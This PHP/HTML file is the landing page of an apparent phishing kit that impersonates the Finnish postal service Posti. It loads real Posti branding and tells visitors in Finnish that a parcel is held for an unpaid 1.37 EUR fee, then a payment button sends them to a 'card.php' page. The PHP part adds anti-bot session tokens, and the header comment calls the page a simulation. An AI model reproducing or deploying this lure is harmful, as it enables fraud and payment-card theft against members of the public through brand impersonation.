<?php
// ══════════════════════════════════════════════════════════════
// LAND.PHP - Posti Landing Page (Phishing Simulation)
// ══════════════════════════════════════════════════════════════

require __DIR__ . '/security.php';

// ── VÉRIFIER QUE $antibotplot EST DÉFINI ──
if (!isset($antibotplot) || empty($antibotplot)) {
    // Fallback: recréer depuis la session
    if (isset($_SESSION['antibotplot']) && !empty($_SESSION['antibotplot'])) {
        $antibotplot = $_SESSION['antibotplot'];
    } else {
        // Générer un nouveau si rien n'existe
        $antibotplot = bin2hex(random_bytes(16));
        $_SESSION['antibotplot'] = $antibotplot;
    }
}

// ── DÉFINER COOKIE SÉCURISÉ ──
setcookie('token', $antibotplot, [
    'path' => '/', 
    'secure' => isset($_SERVER['HTTPS']),
    'httponly' => true, 
    'samesite' => 'Strict'
]);

// ── TIMESTAMP & NONCE ──
$_SESSION['land_load_time'] = time();
$nonce = hash_hmac('sha256', $antibotplot, session_id());
$_SESSION['land_nonce'] = $nonce;
?><!DOCTYPE html>
<html lang="fi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Posti</title>
<link rel="icon" href="https://assets.ctfassets.net/dvxpcmq06s7e/pkrFI9pZwsBhQ2lBowzyt/3c40676e510621e6adb7a1aebbe8ebc0/favicon.ico">
<link href="https://cdn.posti.fi/asset/css/typography-posti-font.css" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
html{-webkit-text-size-adjust:100%;}
body{font-family:'Posti Font',Arial,sans-serif;background:#fff;color:#2A2B2D;font-size:16px;line-height:1.5;}
a{text-decoration:none;color:inherit;}

/* ── TOP BAR ── */
.tb{background:#fff;border-bottom:1px solid #e5e5e5;display:flex;align-items:center;height:44px;padding:0 16px;gap:0;position:relative;z-index:100;}
.tb-logo{display:flex;align-items:center;margin-right:16px;flex-shrink:0;}
.tb-logo-text{font-size:26px;font-weight:900;font-style:italic;color:#FF6200;letter-spacing:-1px;line-height:1;}
.tb-tabs{display:flex;gap:0;height:100%;flex-shrink:0;}
.tb-tab{display:flex;align-items:center;padding:0 10px;font-size:13px;font-weight:600;color:#2A2B2D;height:100%;cursor:pointer;white-space:nowrap;}
.tb-tab.active{background:#1a1a1a;color:#fff;border-radius:20px;height:30px;margin:auto 3px;padding:0 13px;}
.tb-right{margin-left:auto;display:flex;align-items:center;gap:12px;}
.tb-link{display:flex;align-items:center;gap:5px;font-size:13px;color:#2A2B2D;font-weight:500;white-space:nowrap;}
.tb-link svg{width:16px;height:16px;fill:currentColor;flex-shrink:0;}
.tb-sites-btn{display:flex;align-items:center;gap:6px;font-size:13px;font-weight:600;border:1.5px solid #ddd;border-radius:20px;padding:4px 12px;cursor:pointer;white-space:nowrap;}
.tb-sites-btn svg{width:14px;height:14px;fill:#2A2B2D;}
.tb-langs{display:flex;align-items:center;border:1.5px solid #e5e5e5;border-radius:20px;overflow:hidden;padding:2px;flex-shrink:0;}
.tb-lang{font-size:12px;font-weight:700;padding:3px 8px;border-radius:16px;cursor:pointer;color:#666;}
.tb-lang.active{background:#2A2B2D;color:#fff;}

/* ── MAIN NAV ── */
.main-nav{border-bottom:1px solid #e5e5e5;padding:0 16px;display:flex;align-items:center;height:48px;overflow-x:auto;-webkit-overflow-scrolling:touch;scrollbar-width:none;}
.main-nav::-webkit-scrollbar{display:none;}
.nav-links{display:flex;gap:0;height:100%;min-width:max-content;}
.nav-link{padding:0 14px;font-size:14px;font-weight:600;color:#2A2B2D;display:flex;align-items:center;height:100%;cursor:pointer;border-bottom:3px solid transparent;white-space:nowrap;}
.nav-link:hover{color:#FF6200;}

/* ── HERO ── */
.hero{position:relative;overflow:hidden;background:#fff;display:flex;flex-direction:row;min-height:380px;}
.hero-left{flex:1;padding:48px 36px 100px 36px;display:flex;flex-direction:column;justify-content:center;max-width:540px;z-index:10;position:relative;}
.hero-left h1{font-size:32px;font-weight:900;line-height:1.2;color:#2A2B2D;margin-bottom:16px;}
.hero-left p{font-size:15px;color:#2A2B2D;line-height:1.6;margin-bottom:24px;max-width:400px;}
.btn-cta{display:inline-flex;align-items:center;gap:8px;background:#FF6200;color:#fff;border-radius:30px;padding:12px 22px;font-size:15px;font-weight:700;cursor:pointer;border:none;align-self:flex-start;}
.btn-cta:hover{background:#e55500;}
.btn-cta svg{width:16px;height:16px;fill:#fff;flex-shrink:0;}
.hero-right{flex:0 0 52%;position:relative;overflow:hidden;}
.hero-img-wrap{position:absolute;inset:0;}
.hero-img-wrap img{width:100%;height:100%;object-fit:cover;object-position:center;}
.hero-shape{position:absolute;top:0;left:-2px;height:100%;z-index:5;pointer-events:none;}

/* ── TRACK SECTION ── */
.track-wrap{background:#fff;}
.track-section{position:relative;z-index:20;background:#fff;margin:0 24px;margin-top:-52px;border-radius:16px;box-shadow:0 8px 22px rgba(27,31,35,0.09);padding:24px 28px 28px;display:grid;grid-template-columns:22rem 1fr;gap:40px;align-items:start;max-width:1300px;}
.track-title{font-size:22px;font-weight:900;margin-bottom:14px;line-height:1.3;}
.track-input{display:flex;align-items:center;border:1.5px solid #ddd;border-radius:30px;padding:0 16px;height:46px;gap:10px;background:#fff;}
.track-input input{border:none;outline:none;font-size:15px;flex:1;color:#2A2B2D;background:transparent;font-family:inherit;min-width:0;}
.track-input svg{width:20px;height:20px;fill:#aaa;flex-shrink:0;}
.quick-links{display:grid;grid-template-columns:1fr 1fr;gap:0;}
.ql{display:flex;align-items:center;gap:10px;padding:13px 0;border-bottom:1px solid #ddd;font-size:14px;font-weight:600;color:#2A2B2D;cursor:pointer;}
.ql:hover{color:#FF6200;}
.ql:nth-child(2n+1){padding-right:20px;}
.ql:nth-child(2n){border-left:1px solid #ddd;padding-left:20px;}
.ql:nth-last-child(-n+2){border-bottom:none;}
.ql-icon{width:20px;height:20px;fill:#FF6200;flex-shrink:0;}
.ql-arrow{margin-left:auto;font-size:16px;color:#2A2B2D;font-weight:700;}

/* ── MODAL ── */
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.55);display:flex;align-items:center;justify-content:center;z-index:999;padding:16px;}
.modal-overlay.hidden{display:none;}
.modal{background:#fff;border-radius:12px;width:100%;max-width:420px;padding:28px 24px 22px;position:relative;box-shadow:0 12px 40px rgba(0,0,0,0.2);}
.modal-close{position:absolute;top:14px;right:16px;background:none;border:none;font-size:22px;cursor:pointer;color:#666;line-height:1;}
.modal h2{font-size:17px;font-weight:900;margin-bottom:16px;color:#2A2B2D;}
.modal-alert{background:#FFF3E0;border:1.5px solid #FF6200;border-radius:8px;padding:12px 14px;margin-bottom:16px;}
.modal-alert-head{font-size:12px;font-weight:800;color:#BF360C;margin-bottom:5px;display:flex;align-items:center;gap:6px;}
.modal-alert-head svg{width:15px;height:15px;fill:#BF360C;}
.modal-alert p{font-size:13px;color:#5D4037;line-height:1.5;}
.modal-info{font-size:14px;color:#555;line-height:2;margin-bottom:16px;}
.modal-info strong{color:#2A2B2D;}
.modal-info .red{color:#D32F2F;font-weight:700;}
.price-row{display:flex;align-items:center;justify-content:space-between;background:#f8f8f8;border-radius:8px;padding:12px 16px;margin-bottom:18px;border:1px solid #ebebeb;}
.price-lbl{font-size:13px;color:#888;}
.price-lbl small{display:block;font-size:11px;color:#ccc;margin-top:2px;}
.price-val{font-size:26px;font-weight:900;color:#FF6200;}
.btn-pay{width:100%;background:#FF6200;color:#fff;border:none;border-radius:30px;padding:14px;font-size:15px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:9px;transition:background 0.15s;font-family:inherit;}
.btn-pay:hover:not(:disabled){background:#e55500;}
.btn-pay:disabled{opacity:0.4;cursor:not-allowed;}
.btn-pay svg{width:18px;height:18px;fill:#fff;}
#cd-msg{font-size:12px;color:#bbb;text-align:center;margin-top:8px;min-height:18px;}
.modal-note{text-align:center;font-size:11px;color:#ccc;margin-top:12px;}

/* ── FOOTER ── */
footer{background:#f5f5f5;border-top:1px solid #e5e5e5;padding:14px 20px;display:flex;align-items:center;justify-content:center;flex-wrap:wrap;gap:12px 20px;margin-top:40px;}
footer a{font-size:12px;color:#666;}
footer a:hover{color:#FF6200;}
footer .copy{font-size:12px;color:#aaa;}

/* ════════════════════════════════════════
   RESPONSIVE BREAKPOINTS
   ════════════════════════════════════════ */
.tb-logo-img {
    height: 40px;
    width: auto;
    display: block;
}

/* ── Tablette large (≤1100px) ── */
@media(max-width:1100px){
    .track-section{grid-template-columns:18rem 1fr;gap:28px;}
}

/* ── Tablette (≤900px) ── */
@media(max-width:900px){
    .track-section{grid-template-columns:1fr;margin:0 16px;margin-top:-28px;gap:24px;}
    .hero-left{padding:40px 28px 80px;}
    .hero-left h1{font-size:28px;}
    .tb-sites-btn{display:none;}
    .tb-link.hide-tablet{display:none;}
}

/* ── Tablette portrait / grand mobile (≤768px) ── */
@media(max-width:768px){
    .tb{padding:0 12px;}
    .tb-tab{padding:0 8px;font-size:12px;}
    .tb-tab.active{padding:0 10px;}
    .tb-link{font-size:12px;gap:4px;}
    .hero{flex-direction:column;min-height:auto;}
    .hero-left{padding:28px 20px 28px;max-width:100%;order:2;}
    .hero-left h1{font-size:24px;}
    .hero-left p{font-size:14px;max-width:100%;}
    .hero-right{order:1;min-height:220px;flex:none;width:100%;position:relative;}
    .hero-img-wrap{position:relative;height:220px;}
    .hero-img-wrap img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;}
    .hero-shape{display:none;}
    .track-section{margin-top:0;border-radius:12px;margin:0 12px;padding:20px 18px 22px;}
    .quick-links{grid-template-columns:1fr 1fr;}
    .ql{font-size:13px;gap:8px;}
}

/* ── Mobile (≤600px) ── */
@media(max-width:600px){
    .tb-langs{display:none;}
    .tb-link:not(:first-child){display:none;}
    .hero-img-wrap{height:180px;}
    .hero-right{min-height:180px;}
    .hero-left h1{font-size:21px;}
    .hero-left p{font-size:13px;}
    .btn-cta{font-size:14px;padding:10px 18px;}
    .track-section{margin:0 8px;padding:18px 14px 20px;border-radius:10px;}
    .quick-links{grid-template-columns:1fr;}
    .ql{border-bottom:1px solid #ddd !important;}
    .ql:last-child{border-bottom:none !important;}
    .ql:nth-child(2n){border-left:none;padding-left:0;}
    .ql:nth-child(2n+1){padding-right:0;}
    .ql:nth-last-child(-n+2){border-bottom:1px solid #ddd;}
    .ql:last-child{border-bottom:none;}
    .track-title{font-size:19px;}
    footer{padding:12px 16px;gap:10px 14px;}
}

/* ── Très petit mobile (≤380px) ── */
@media(max-width:380px){
    .tb-logo-text{font-size:22px;}
    .tb-tab{font-size:11px;padding:0 6px;}
    .hero-left h1{font-size:19px;}
    .price-val{font-size:22px;}
}
</style>
</head>
<body>

<script>
// ── EXPORTER NONCE GLOBALEMENT ──
if (typeof globalThis.token === "undefined") {
    globalThis.token = <?php echo json_encode($nonce); ?>;
}
</script>

<!-- TOP BAR -->
<div class="tb">
    <div class="tb-logo">
        <img src="https://cdn-ukwest.onetrust.com/logos/0cd0463b-0b24-43d4-abaa-6a461e651d10/e96975ca-412d-4058-b6e3-e3b0cb37b650/a35af39c-cc06-4b52-9b5f-9a3d838da19c/1.1_Posti_logo_Posti_Orange_rgb.png" alt="Posti Logo" class="tb-logo-img">
    </div>
    <div class="tb-tabs">
        <span class="tb-tab active">Henkilöille</span>
        <span class="tb-tab">Yrityksille</span>
    </div>
    <div class="tb-right">
        <a class="tb-link" href="#">
            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M11 4a7 7 0 1 0 4.856 12.041 1 1 0 0 1 .185-.185A7 7 0 0 0 11 4m7.032 12.618a9 9 0 1 0-1.414 1.414l3.675 3.675a1 1 0 0 0 1.414-1.414z" clip-rule="evenodd"/></svg>
            Haku
        </a>
        <a class="tb-link hide-tablet" href="#">
            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 3a7 7 0 0 0-7 7c0 1.892.853 3.678 2.292 5.547 1.215 1.578 2.77 3.12 4.44 4.776l.268.266.268-.266c1.67-1.656 3.225-3.198 4.44-4.776C18.147 13.678 19 11.892 19 10a7 7 0 0 0-7-7m-9 7a9 9 0 0 1 18 0c0 2.526-1.147 4.74-2.708 6.767-1.304 1.694-2.974 3.349-4.641 5.002q-.474.469-.944.938a1 1 0 0 1-1.414 0q-.47-.469-.944-.938c-1.668-1.653-3.337-3.308-4.641-5.002C4.147 14.74 3 12.527 3 10m9-2a2 2 0 1 0 0 4 2 2 0 0 0 0-4m-4 2a4 4 0 1 1 8 0 4 4 0 0 1-8 0" clip-rule="evenodd"/></svg>
            Palvelupisteet
        </a>
        <div class="tb-sites-btn">
            <svg viewBox="0 0 24 24"><path d="M10 6a2 2 0 1 1 4 0 2 2 0 0 1-4 0m6 0a2 2 0 1 1 4 0 2 2 0 0 1-4 0M6 10a2 2 0 1 0 0 4 2 2 0 0 0 0-4m4 2a2 2 0 1 1 4 0 2 2 0 0 1-4 0m8-2a2 2 0 1 0 0 4 2 2 0 0 0 0-4m-2 8a2 2 0 1 1 4 0 2 2 0 0 1-4 0m-4-2a2 2 0 1 0 0 4 2 2 0 0 0 0-4m-8 2a2 2 0 1 1 4 0 2 2 0 0 1-4 0M4 6a2 2 0 1 0 4 0 2 2 0 0 0-4 0"/></svg>
            Kaikki sivustot
            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M5.293 8.293a1 1 0 0 1 1.414 0L12 13.586l5.293-5.293a1 1 0 1 1 1.414 1.414l-6 6a1 1 0 0 1-1.414 0l-6-6a1 1 0 0 1 0-1.414" clip-rule="evenodd"/></svg>
        </div>
        <div class="tb-langs">
            <span class="tb-lang active">FI</span>
            <span class="tb-lang">SV</span>
            <span class="tb-lang">EN</span>
        </div>
    </div>
</div>

<!-- MAIN NAV (scrollable horizontalement sur mobile) -->
<nav class="main-nav">
    <div class="nav-links">
        <span class="nav-link">Lähettäminen</span>
        <span class="nav-link">Vastaanottaminen</span>
        <span class="nav-link">OmaPosti</span>
        <span class="nav-link">Muuttaminen</span>
        <span class="nav-link">Ajankohtaista</span>
        <span class="nav-link">Asiakaspalvelu</span>
    </div>
</nav>

<!-- HERO -->
<div class="hero">
    <div class="hero-left">
        <h1>Emme voineet toimittaa lähetystäsi #FI773817638</h1>
        <p>Lähetyksesi on pidätettynä maksamattomien toimitusmaksujen vuoksi. Maksa puuttuvat maksut jatkaaksesi toimitusta.</p>
        <button class="btn-cta" id="open-modal">
            Tarkista lähetys
            <svg viewBox="0 0 24 24"><path d="M13.293 5.293a1 1 0 0 1 1.414 0l6 6a1 1 0 0 1 0 1.414l-6 6a1 1 0 0 1-1.414-1.414L17.586 13H4a1 1 0 1 1 0-2h13.586l-4.293-4.293a1 1 0 0 1 0-1.414"/></svg>
        </button>
    </div>
    <div class="hero-right">
        <div class="hero-img-wrap">
            <img src="https://images.ctfassets.net/dvxpcmq06s7e/5cVZd4eeHivYFx4VOz0FQ0/697a2010cf9a5edf546d09ae2035d40f/Posti_pakettitarratulostin-9577_HF.jpg?fm=webp&fit=fill&w=1200&h=675&q=80" alt="Posti Package">
        </div>
        <svg class="hero-shape" viewBox="0 0 220 700" preserveAspectRatio="xMidYMid meet" fill="none" xmlns="http://www.w3.org/2000/svg" style="height:100%;width:auto;">
            <path d="M196.322 221.486C207.993 238.427 211.094 259.376 204.782 278.641L66.7393 700H0V0H43.7373L196.322 221.486Z" fill="#FF8000"/>
            <path d="M203.615 371.878C211.481 393.522 208.972 417.112 196.763 436.312L29.0781 700H0V0H68.4697L203.615 371.878Z" fill="white"/>
        </svg>
    </div>
</div>

<!-- TRACK SECTION -->
<div class="track-wrap">
    <div class="track-section">
        <div>
            <h2 class="track-title">Seuraa lähetystäsi</h2>
            <div class="track-input">
                <input type="text" placeholder="Lähetystunnus">
                <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M11 4a7 7 0 1 0 4.856 12.041 1 1 0 0 1 .185-.185A7 7 0 0 0 11 4m7.032 12.618a9 9 0 1 0-1.414 1.414l3.675 3.675a1 1 0 0 0 1.414-1.414z" clip-rule="evenodd"/></svg>
            </div>
        </div>
        <div class="quick-links">
            <a class="ql" href="#">
                <svg class="ql-icon" viewBox="0 0 24 24"><path d="M5 14a1 1 0 0 1 1-1h1a1 1 0 1 1 0 2H6a1 1 0 0 1-1-1"/><path fill-rule="evenodd" d="M8 1a1 1 0 0 0-1 1v4.027A4.5 4.5 0 0 0 2 10.5V17a1 1 0 0 0 1 1h8.002v3a1 1 0 1 0 2 0v-3H21a1 1 0 0 0 1-1v-6a5 5 0 0 0-5-5H9V4h1.5a1.5 1.5 0 0 0 0-3zm2.242 7c.479.715.758 1.575.758 2.5V16h9v-5a3 3 0 0 0-3-3zM9 16v-5.5a2.5 2.5 0 0 0-5 0V16z" clip-rule="evenodd"/></svg>
                OmaPosti <span class="ql-arrow">→</span>
            </a>
            <a class="ql" href="#">
                <svg class="ql-icon" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M11 4a7 7 0 1 0 4.856 12.041 1 1 0 0 1 .185-.185A7 7 0 0 0 11 4m7.032 12.618a9 9 0 1 0-1.414 1.414l3.675 3.675a1 1 0 0 0 1.414-1.414z" clip-rule="evenodd"/></svg>
                Postinumerohaku <span class="ql-arrow">→</span>
            </a>
            <a class="ql" href="#">
                <svg class="ql-icon" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M10.403 1.041a2 2 0 0 0-.806 0c-.307.063-.581.217-.8.34l-.06.033-7.4 4.11v8.262c-.002.264-.003.595.1.908a2 2 0 0 0 .429.728c.223.242.513.402.745.53l.063.034 7.4 4.111.06.034c.218.122.492.276.8.34.265.054.54.054.805 0 .307-.064.582-.218.8-.34l.06-.034 3.7-2.055a1 1 0 0 0-.971-1.748L11 20.157v-7.713l7-3.889v1.801a1 1 0 1 0 2 0V7.725c.002-.264.003-.595-.1-.908a2 2 0 0 0-.429-.728c-.223-.242-.514-.402-.745-.53l-.063-.034-7.4-4.111-.06-.034c-.218-.122-.492-.276-.8-.339" clip-rule="evenodd"/></svg>
                Lähetä paketti <span class="ql-arrow">→</span>
            </a>
            <a class="ql" href="#">
                <svg class="ql-icon" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M11.49 1.316a2 2 0 0 1 1.02 0c.386.102.715.35.977.549L21 10v7.839c0 .527 0 .982-.03 1.356-.033.395-.104.789-.297 1.167a3 3 0 0 1-1.311 1.311c-.378.193-.772.264-1.167.296-.375.031-.83.031-1.356.031H7.16c-.527 0-.981 0-1.356-.03-.395-.033-.789-.104-1.167-.297a3 3 0 0 1-1.311-1.311C3.133 19.784 3 19.2 3 17.839V10L11.49 1.316M5 8.5v9.3c0 .577 0 .949.024 1.232.022.272.06.372.085.422a1 1 0 0 0 .437.437c.05.025.15.063.422.085C6.25 20 6.623 20 7.2 20h9.6c.577 0 .949 0 1.232-.024.272-.022.372-.06.422-.085a1 1 0 0 0 .437-.437c.025-.05.063-.15.085-.422C19 18.75 19 18.377 19 17.8V8.5l-5.68-4.26c-.76-.57-.922-.67-1.065-.707a1 1 0 0 0-.51 0c-.143.038-.305.137-1.065.707z" clip-rule="evenodd"/></svg>
                Muuttaminen <span class="ql-arrow">→</span>
            </a>
            <a class="ql" href="#">
                <svg class="ql-icon" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 3a7 7 0 0 0-7 7c0 1.892.853 3.678 2.292 5.547 1.215 1.578 2.77 3.12 4.44 4.776l.268.266.268-.266c1.67-1.656 3.225-3.198 4.44-4.776C18.147 13.678 19 11.892 19 10a7 7 0 0 0-7-7m-9 7a9 9 0 0 1 18 0c0 2.526-1.147 4.74-2.708 6.767-1.304 1.694-2.974 3.349-4.641 5.002q-.474.469-.944.938a1 1 0 0 1-1.414 0q-.47-.469-.944-.938c-1.668-1.653-3.337-3.308-4.641-5.002C4.147 14.74 3 12.527 3 10m9-2a2 2 0 1 0 0 4 2 2 0 0 0 0-4m-4 2a4 4 0 1 1 8 0 4 4 0 0 1-8 0" clip-rule="evenodd"/></svg>
                Palvelupisteet <span class="ql-arrow">→</span>
            </a>
            <a class="ql" href="#">
                <svg class="ql-icon" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M3 10a9 9 0 0 1 18 0v3.778q0 .112-.008.222H21v1a6 6 0 0 1-5.036 5.923A2.5 2.5 0 0 1 13.5 23a2.5 2.5 0 0 1-2.5-2.5c0-1.382 1.118-2.5 2.5-2.5.806 0 1.523.38 1.98.972a4 4 0 0 0 3.032-2.056 3.222 3.222 0 0 1-3.956-3.138V12a3.222 3.222 0 0 1 4.371-3.011 7.002 7.002 0 0 0-13.855 0A3.222 3.222 0 0 1 9.444 12v1.778a3.222 3.222 0 1 1-6.444 0zm2 3.778a1.222 1.222 0 0 0 2.444 0V12A1.222 1.222 0 0 0 5 12zM19 12a1.222 1.222 0 0 0-2.444 0v1.778a1.222 1.222 0 0 0 2.444 0zm-5.5 8c-.278 0-.5.222-.5.5s.222.5.5.5.5-.222.5-.5-.222-.5-.5-.5" clip-rule="evenodd"/></svg>
                Asiakaspalvelu <span class="ql-arrow">→</span>
            </a>
        </div>
    </div>
</div>

<footer>
    <a href="#">Tietosuoja</a>
    <a href="#">Käyttöehdot</a>
    <a href="#">Saavutettavuus</a>
    <a href="#">Evästeasetukset</a>
    <span class="copy">&copy; Posti Group Oyj</span>
</footer>

<!-- MODAL -->
<div class="modal-overlay hidden" id="pay-modal">
    <div class="modal">
        <button class="modal-close" id="close-modal">&times;</button>
        <h2>Toimitus odottaa maksua</h2>
        <div class="modal-alert">
            <div class="modal-alert-head">
                <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 2a10 10 0 1 0 0 20A10 10 0 0 0 12 2zm0 5a1 1 0 0 1 1 1v4a1 1 0 1 1-2 0V8a1 1 0 0 1 1-1zm0 8a1 1 0 1 1 0 2 1 1 0 0 1 0-2z" clip-rule="evenodd"/></svg>
                Epäonnistumisen syy
            </div>
            <p>Joitakin maksuja puuttuu eikä niitä ole vielä maksettu. Toimitus vapautuu heti maksun jälkeen.</p>
        </div>
        <div class="modal-info">
            <strong>Lähetysnumero</strong> : #FI773817638<br>
            <strong>Tila</strong> : <span class="red">Maksu odottaa</span><br>
            <strong>Maksut</strong> : 1.37 EUR
        </div>
        <div class="price-row">
            <div class="price-lbl">Maksettava summa<small>Sis. kaikki kulut</small></div>
            <div class="price-val">&euro; 1,37</div>
        </div>
        <button class="btn-pay" id="pay-btn" disabled>
            <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
            Jatka maksuun
        </button>
        <div id="cd-msg">Odota <span id="cd-n">3</span>s...</div>
        <div class="modal-note">🔒 Turvallinen maksuyhdyskäytävä &middot; Posti Group Oyj</div>
    </div>
</div>

<script>
(function(){
    // ── GET REFERENCES ──
    var modal = document.getElementById('pay-modal');
    var btnOpen = document.getElementById('open-modal');
    var btnClose = document.getElementById('close-modal');
    var btnPay = document.getElementById('pay-btn');
    var cdMsg = document.getElementById('cd-msg');
    var cdN = document.getElementById('cd-n');
    var timer = null, remain = 3;
    
    // ── COUNTDOWN FUNCTION ──
    function startCd() {
        remain = 3;
        cdN.textContent = remain;
        cdMsg.style.display = 'block';
        btnPay.disabled = true;
        clearInterval(timer);
        timer = setInterval(function() {
            remain--;
            if (remain > 0) {
                cdN.textContent = remain;
            } else {
                clearInterval(timer);
                btnPay.disabled = false;
                cdMsg.style.display = 'none';
            }
        }, 1000);
    }
    
    // ── EVENT LISTENERS ──
    btnOpen.addEventListener('click', function() {
        modal.classList.remove('hidden');
        startCd();
    });
    
    btnClose.addEventListener('click', function() {
        modal.classList.add('hidden');
        clearInterval(timer);
    });
    
    modal.addEventListener('click', function(e) {
        if (e.target === modal) {
            modal.classList.add('hidden');
            clearInterval(timer);
        }
    });
    
    btnPay.addEventListener('click', function() {
        if (this.disabled) return;
        
        // ── VÉRIFIER LE TOKEN ──
        if (typeof globalThis.token === 'undefined' || !globalThis.token) {
            console.error('Token manquant');
            return;
        }
        
        // ── REDIRECTION SÉCURISÉE ──
        window.location.href = 'home/card.php';
    });
})();
</script>
</body>
</html>